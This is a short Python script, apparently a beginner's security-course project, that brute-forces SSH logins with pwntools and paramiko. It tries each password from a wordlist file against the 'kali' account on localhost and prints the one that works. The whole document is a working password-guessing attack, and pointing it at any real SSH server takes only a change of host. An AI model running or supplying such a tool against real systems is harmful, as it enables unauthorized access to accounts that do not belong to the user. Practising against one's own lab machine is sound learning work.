#Project 1 : SSH login, Brute Forcing

from pwn import *
import paramiko # error handling

host = "127.0.0.1"
username = "kali"
attempts = 0

with open("test.txt","r") as f:
	for password in f:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password : {}!".format(attempts, password))
			response = ssh(host = host, user = username, password = password, timeout = 5)
			if response.connected():
				print("[>] valid password found: {}".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1